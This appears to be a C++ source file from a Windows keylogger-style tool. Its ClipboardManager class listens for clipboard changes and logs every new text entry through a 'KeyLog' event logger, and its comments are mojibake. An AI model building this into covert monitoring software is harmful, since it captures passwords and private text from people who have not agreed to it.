#include "ClipboardManager.h"
#include "LogManager.h"


void ClipboardManager::Start()
{
	bool ret = AddClipboardFormatListener(GlobalData::hWindow);
	if (ret)
	{
		KeyLog::Log("ClipboardManager AddClipboardFormatListener Sec!\n");
	}
	else
	{
		KeyLog::Log("ClipboardManager AddClipboardFormatListener Fail! Error = " + to_string(GetLastError()));
	}
}
void ClipboardManager::Update()
{
	OnClipboardChange();
}
void ClipboardManager::HandleMsg(const MSG& rMsg)
{
	OnClipboardChange();
}
void ClipboardManager::OnDestroy()
{
	RemoveClipboardFormatListener(GlobalData::hWindow);
}
void ClipboardManager::OnClipboardChange()
{
	if (OpenClipboard(NULL))//�򿪼�����  
	{
		if (IsClipboardFormatAvailable(CF_TEXT))//�жϸ�ʽ�Ƿ�����������Ҫ  
		{
			//��ȡ����  
			HANDLE hClip = GetClipboardData(CF_TEXT);
			if (hClip != NULL)
			{
				char* pBuf = (char*)GlobalLock(hClip);
				if (pBuf != nullptr)
				{
					string clipData(pBuf);
					if (mClipOldStr != clipData)
					{
						KeyLog::LogEvent(EVENT_TYPE::EVENT_CLIP_CHANGE, clipData);
						mClipOldStr = clipData;
					}
				}
				GlobalUnlock(hClip);
			}
		}
		CloseClipboard();
	}
}